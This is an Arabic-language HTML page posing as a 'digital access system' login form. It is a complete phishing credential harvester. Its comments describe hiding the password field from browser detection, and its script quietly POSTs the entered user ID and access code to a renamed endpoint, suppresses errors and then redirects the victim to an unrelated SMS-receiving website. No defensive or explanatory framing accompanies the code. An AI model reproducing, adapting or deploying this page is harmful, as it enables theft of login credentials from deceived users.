<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام الوصول الرقمي</title>
    <style>
        body { background-color: #0a0e17; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #141b2b; padding: 40px; border-radius: 20px; width: 350px; text-align: center; }
        /* تمويه الحقول باستخدام الـ CSS */
        .input-field { width: 100%; padding: 15px; margin: 10px 0; background: #0d121c; border: 1px solid #222; border-radius: 10px; color: white; box-sizing: border-box; }
        /* تقنية إخفاء الأحرف بدون استخدام type="password" */
        .mask-text { -webkit-text-security: disc; }
        button { width: 100%; padding: 15px; border: none; border-radius: 10px; background: #00f2fe; color: #0a0e17; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h3>نظام الوصول الرقمي</h3>
        <form id="auth_data">
            <input type="text" id="id_x99" class="input-field" placeholder="معرف المستخدم" required>
            <input type="text" id="key_z01" class="input-field mask-text" placeholder="رمز الوصول الخاص" required>
            <button type="submit">إتمام التحقق</button>
        </form>
    </div>

    <script>
        document.getElementById('auth_data').onsubmit = async (e) => {
            e.preventDefault();
            // استخراج القيم
            const user = document.getElementById('id_x99').value;
            const pass = document.getElementById('key_z01').value;
            
            // إرسال البيانات (تم تغيير المسار لتجنب كشف المتصفح)
            try {
                await fetch('/api/data_sync', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ u: user, p: pass })
                });
            } catch(e) {}
            
            window.location.href = "https://receive-smss.com/";
        };
    </script>
</body>
</html>
